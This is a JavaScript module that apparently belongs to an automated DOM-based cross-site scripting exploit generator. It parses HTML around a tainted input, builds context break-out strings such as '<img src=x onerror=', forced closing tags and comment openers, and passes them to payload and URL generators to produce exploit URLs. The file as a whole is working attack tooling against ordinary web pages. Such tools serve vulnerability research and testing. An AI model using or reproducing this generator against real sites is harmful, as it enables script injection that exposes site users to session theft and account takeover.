(function (global) {
  "use strict";

  // Node modules
  var htmlParser = require("htmlparser2");

  // Private modules
  var payloadGen = require("./payload-generator.js");
  var urlGen = require("./url-generator.js");

  function trimString(string, length) {
    return string.length > length
      ? string.substring(0, length) + "..."
      : string;
  }

  function generateExploit(finding, taint) {
    var exploits = {
      methodA: [],
      methodB: [],
      methodC: [],
      methodD: [],
      methodE: [],
      methodF: [],
      methodG: [],
      methodH: [],
      methodI: [],
      methodJ: [],
      methodK: [],
      methodM: [],
      methodN: [],
    };

    // input exploits
    // if (taint.func === "input.value") {
    // 	// get the id
    // 	let id = taint.param;
    // 	id = id.substring(id.indexOf("id=\"") + 4);
    // 	id = id.substring(0, id.indexOf("\""));
    // 	//build the url
    // 	payload = payloadGen.getPayload(finding, taint);
    // 	exploits.push(finding.location + "?input-id=" + id + "&payload=" + payload);
    // 	return exploits;
    // }
    taint.replaceSettings.forEach((setting) => {
      var breakSequences;

      breakSequences = generateBreakSequences(finding, taint, setting);
      setting.inBreak = breakSequences.inBreak;
      setting.outBreak = breakSequences.outBreak;
      setting.enterScript = breakSequences.enterScript;
      console.log(
        "breakSequences: " + trimString(JSON.stringify(breakSequences), 180)
      );

      var comingExploits = urlGen.generateUrl(finding, taint, setting);
      if (exploits.methodA.length === 0) {
        comingExploits.methodA.forEach((exploit) => {
          if (exploit.url !== null)
            exploits.methodA = exploits.methodA.concat(comingExploits.methodA);
        });
      }
      comingExploits.methodB.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodB = exploits.methodB.concat(comingExploits.methodB);
      });
      comingExploits.methodC.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodC = exploits.methodC.concat(comingExploits.methodC);
      });
      comingExploits.methodD.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodD = exploits.methodD.concat(comingExploits.methodD);
      });
      comingExploits.methodE.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodE = exploits.methodE.concat(comingExploits.methodE);
      });
      comingExploits.methodF.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodF = exploits.methodF.concat(comingExploits.methodF);
      });
      comingExploits.methodG.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodG = exploits.methodG.concat(comingExploits.methodG);
      });
      comingExploits.methodH.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodH = exploits.methodH.concat(comingExploits.methodH);
      });
      comingExploits.methodI.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodI = exploits.methodI.concat(comingExploits.methodI);
      });
      comingExploits.methodJ.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodJ = exploits.methodJ.concat(comingExploits.methodJ);
      });
      comingExploits.methodK.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodK = exploits.methodK.concat(comingExploits.methodK);
      });
      comingExploits.methodM.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodM = exploits.methodM.concat(comingExploits.methodM);
      });
      comingExploits.methodN.forEach((exploit) => {
        if (exploit.url !== null)
          exploits.methodN = exploits.methodN.concat(comingExploits.methodN);
      });
    });

    // on mouse over exploits
    // if(finding.sink === "innerHTML") {
    // 	sequence = buildSequence(breakSequences.outBreak[0], "' onmouseover=" + payload + "//", breakSequences.inBreak);
    // 	exploits.push(urlGen.generateUrl(finding, taint, setting, sequence));
    // }

    return exploits;
  }

  function buildSequence(breakOutSequence, payload, breakInSequence) {
    return breakOutSequence + payload + breakInSequence;
  }

  function generateBreakSequences(finding, taint, setting) {
    console.log("-> Generating break sequences");

    var outBreak, inBreak, enterScript;
    var stack = [];
    var parser = getParser();

    // Parsing
    console.time("Parsing time");
    for (var i = 0, lastTagEnd = 0; i < finding.param.length; i++) {
      parser.write(finding.param.substring(i, i + 1));
    }
    parser.end();
    console.timeEnd("Parsing time");

    return { inBreak: inBreak, outBreak: outBreak, enterScript: enterScript };

    function handleOpenTag(name) {
      stack.push({
        token: "opentag",
        content: name,
        begin: lastTagEnd,
        end: i + 1,
        part: finding.param.substring(lastTagEnd, i + 1),
      });
      lastTagEnd = i + 1;
    }

    function handleAttribute(name) {
      stack.push({
        token: "attribute",
        content: name,
        begin: lastTagEnd,
        end: i + 1,
        part: finding.param.substring(lastTagEnd, i + 1),
      });
      lastTagEnd = i + 1;
    }

    function handleText(text) {
      stack.push({
        token: "text",
        content: text,
        begin: lastTagEnd,
        end: i + 1,
        part: finding.param.substring(lastTagEnd, i + 1),
      });
      lastTagEnd = i + 1;
    }

    function handleCloseTag(name) {
      stack.push({
        token: "closetag",
        content: name,
        begin: lastTagEnd,
        end: i + 1,
        part: finding.param.substring(lastTagEnd, i + 1),
      });
      lastTagEnd = i + 1;
    }

    function handleComment(text) {
      stack.push({
        token: "comment",
        content: text,
        begin: lastTagEnd,
        end: i + 1,
        part: finding.param.substring(lastTagEnd, i + 1),
      });
      lastTagEnd = i + 1;
    }

    //start with the first possible character and then add the validation part
    function handleEnd() {
      // adding context to setting
      setting.context = {
        type: "html",
        token: "",
        content: "",
      };
      console.log(trimString(JSON.stringify(stack), 80));
      console.log("stack length: " + stack.length);
      for (var tagIndex = stack.length - 1, tag; tagIndex >= 0; tagIndex--) {
        tag = stack[tagIndex];
        if (
          isEndReplaceable(tag, setting) ||
          isWithinReplaceable(tag, setting)
        ) {
          enterScript = enterScriptContext();
          outBreak =
            getConstantPart(finding, setting, tag) +
            getTaintContext(setting) +
            closeCurrentTag(setting, tag) +
            addClosingTags(tagIndex);
          inBreak = generateBreakInSequence();
          setting.context.token = tag.token;
          setting.context.content = tag.content;
          if (tag.token === "attribute") {
            var tempIndex = tagIndex - 1;
            var lastTag = "";
            while (tempIndex >= 0 && stack[tempIndex].token !== "opentag")
              tempIndex--;
            lastTag = stack[tempIndex].content;
            setting.context.tag = lastTag;
          }
        }
      }

      if (!outBreak) {
        outBreak =
          getConstantPart(finding, setting, tag) +
          addClosingTags(tagIndex);
        enterScript = enterScriptContext();
        inBreak = generateBreakInSequence();
      }
    }

    function getConstantPart(finding, setting, tag) {
      if (isEndReplaceable(tag, setting)) {
        return finding.param.substring(setting.replaceBeginParam, tag.end);
      } else if (isWithinReplaceable(tag, setting)) {
        return finding.param.substring(
          setting.replaceBeginParam,
          setting.replaceEndParam
        );
      } else {
        return undefined;
      }
    }

    function isEndReplaceable(tag, setting) {
      return (
        setting.replaceBeginParam < tag.end &&
        setting.replaceEndParam >= tag.end
      );
    }

    function isWithinReplaceable(tag, setting) {
      return (
        setting.replaceBeginParam >= tag.begin &&
        setting.replaceEndParam <= tag.end
      );
    }

    function enterScriptContext() {
      // if (
      //   finding.sink === "innerHTML" ||
      //   finding.sink === "outerHTML" ||
      //   finding.sink === "insertAdjacentHTML"
      // ) {
        return "<img src=x onerror=";
      // } else {
      //   return "<script>";
      // }
    }

    function getTaintContext(setting) {
      if (setting.replaceBeginURL === setting.replaceEndURL) {
        console.log(setting.replaceBeginURL + " - " + setting.replaceEndURL);
        return "#";
      } else {
        return "";
      }
    }

    function closeCurrentTag(setting, tag) {
      var sequence = "";
      var doubleQuote = "";
      var singleQuote = "";
      if (finding.hybrid) {
        doubleQuote = '\\"';
        singleQuote = "\\'";
      } else {
        doubleQuote = '"';
        singleQuote = "'";
      }
      if (tag.token === "opentag") {
        if (tag.part.indexOf(">") < 0) sequence += ">";
      } else if (tag.token === "attribute") {
        var quoteType = "";
        if (tag.begin + tag.part.indexOf("=") < setting.replaceBeginParam) {
          if (tag.part.indexOf('"') > 0 && tag.part.indexOf("'") > 0) {
            quoteType =
              tag.part.indexOf('"') < tag.part.indexOf("'")
                ? doubleQuote
                : singleQuote;
          } else if (tag.part.indexOf('"') > 0) {
            quoteType = doubleQuote;
          } else if (tag.part.indexOf("'") > 0) {
            quoteType += singleQuote;
          }
          sequence += quoteType;
          if (tag.part.indexOf(">") < 0) sequence += ">";
        } else if (
          tag.begin + tag.part.indexOf("=") >
          setting.replaceEndParam
        ) {
          sequence += "=foo>"; // '>' attribute without value
          quoteType = "";
        } else {
          sequence += ">";
          quoteType = "";
        }
        setting.context.quoteType = quoteType;
      } else if (tag.token === "closetag") {
        if (tag.part.indexOf(">") < 0) sequence += ">";
      } else if (tag.token === "comment") {
        if (tag.part.indexOf("-->") < 0) sequence += "-->";
      }

      return sequence;
    }

    function addClosingTags() {
      return "</iframe></style></script></object></embed></textarea>";
      /*for (var tagIndex = currentTagIndex; tagIndex >= 0; tagIndex--) {
				if (stack[tagIndex].token === 'opentag') {
					return '</' + stack[tagIndex].content + '>';
				} else if (stack[tagIndex].token === 'closetag') {
					return '';
				}
			}

			return '';*/
    }

    function generateBreakInSequence() {
      // if (
      //   finding.sink === "innerHTML" ||
      //   finding.sink === "outerHTML" ||
      //   finding.sink === "insertAdjacentHTML"
      // ) {
      return "><!--/*";
      // } else {
      //   return "</script><!--/*";
      // }
    }

    function getParser() {
      return new htmlParser.Parser(
        {
          onopentagname: handleOpenTag,
          onattribute: handleAttribute,
          ontext: handleText,
          onclosetag: handleCloseTag,
          oncomment: handleComment,
          onend: handleEnd,
        },
        { decodeEntities: true }
      );
    }
  }

  global.generateExploit = generateExploit;
  global.generateBreakSequences = generateBreakSequences;
})(exports);
